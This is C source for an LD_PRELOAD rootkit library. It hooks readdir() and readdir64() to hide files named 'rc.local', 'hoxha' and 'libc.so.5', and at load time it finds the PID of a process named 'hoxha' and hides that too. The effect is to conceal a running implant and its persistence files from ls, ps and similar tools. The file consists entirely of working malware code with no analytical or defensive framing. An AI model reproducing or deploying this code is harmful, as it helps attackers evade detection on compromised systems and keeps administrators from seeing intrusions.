#define _GNU_SOURCE
#include <dirent.h>
#include <string.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <ctype.h>

#define MAX_HIDDEN 16

// These are the static filenames/directories we always want to hide.
static const char *STATIC_HIDE_NAMES[] = {
    "rc.local",
    "hoxha",
    "libc.so.5",
    NULL
};

// We allocate space for up to MAX_HIDDEN names + a NULL sentinel.
static char *hide_names[MAX_HIDDEN + 1] = { 0 };

// Constructor to hide PID at load time.
// Return 1 if str consists entirely of digits
static int is_all_digits(const char *str) {
    for (; *str; ++str) {
        if (!isdigit((unsigned char)*str)) return 0;
    }
    return 1;
}

// Return 1 if "/proc/<pid>/comm" exactly equals "hoxha"
static int comm_matches(const char *pid) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%s/comm", pid);

    FILE *f = fopen(path, "r");
    if (!f) return 0;

    char comm[256];
    if (!fgets(comm, sizeof(comm), f)) {
        fclose(f);
        return 0;
    }
    fclose(f);

    // Strip trailing newline
    size_t len = strlen(comm);
    if (len > 0 && comm[len - 1] == '\n') {
        comm[len - 1] = '\0';
    }
    return (strcmp(comm, "hoxha") == 0);
}

// Scan /proc for a PID whose comm is "hoxha"
// Return that PID as an integer, or 0 if not found
static int find_hoxha_pid(void) {
    DIR *proc = opendir("/proc");
    if (!proc) return 0;

    struct dirent *entry;
    while ((entry = readdir(proc)) != NULL) {
        if (entry->d_type != DT_DIR) continue;
        if (!is_all_digits(entry->d_name)) continue;

        if (comm_matches(entry->d_name)) {
            int pid = atoi(entry->d_name);
            closedir(proc);
            return pid;
        }
    }
    closedir(proc);
    return 0;
}

// Constructor to build hide_names[] with the pid number.
__attribute__((constructor))
static void init_hide_names(void) {
    int idx = 0;

    // 2.A) Copy all static hide names via strdup()
    for (int i = 0; STATIC_HIDE_NAMES[i] != NULL && idx < MAX_HIDDEN; ++i) {
        hide_names[idx++] = strdup(STATIC_HIDE_NAMES[i]);
    }

    // 2.B) Find the PID of a running "hoxha" (if any) and append it
    int pid = find_hoxha_pid();
    if (pid > 0 && idx < MAX_HIDDEN) {
        // Convert PID to string
        char buf[16];
        snprintf(buf, sizeof(buf), "%d", pid);
        hide_names[idx++] = strdup(buf);
    }

    // 2.C) Null‐terminate the list
    hide_names[idx] = NULL;
}

// Destructor to free strdup()ed strings
__attribute__((destructor))
static void cleanup_hide_names(void) {
    for (int i = 0; i < MAX_HIDDEN && hide_names[i] != NULL; ++i) {
        free(hide_names[i]);
        hide_names[i] = NULL;
    }
}

// Helper to check if a directory entry name should be hidden
static int libhide(const char *name) {
    for (int i = 0; hide_names[i] != NULL; ++i) {
        if (strcmp(name, hide_names[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

// Hook readdir() and readdir64()
static struct dirent *(*orig_readdir)(DIR *)       = NULL;
static struct dirent64 *(*orig_readdir64)(DIR *)   = NULL;

// Tunneled readdir() that skips any entry matching hide_names[]
struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        // Use union to avoid ISO C forbid direct cast
        union { void *p; struct dirent *(*f)(DIR *); } u;
        u.p = dlsym(RTLD_NEXT, "readdir");
        orig_readdir = u.f;
        if (!orig_readdir) {
            errno = ENOSYS;
            return NULL;
        }
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (libhide(entry->d_name)) {
            continue;
        }
        return entry;
    }
    return NULL;
}

// Tunneled readdir64() that skips any entry matching hide_names[]
struct dirent64 *readdir64(DIR *dirp) {
    if (!orig_readdir64) {
        union { void *p; struct dirent64 *(*f)(DIR *); } u;
        u.p = dlsym(RTLD_NEXT, "readdir64");
        orig_readdir64 = u.f;
        if (!orig_readdir64) {
            errno = ENOSYS;
            return NULL;
        }
    }

    struct dirent64 *entry;
    while ((entry = orig_readdir64(dirp)) != NULL) {
        if (libhide(entry->d_name)) {
            continue;
        }
        return entry;
    }
    return NULL;
}
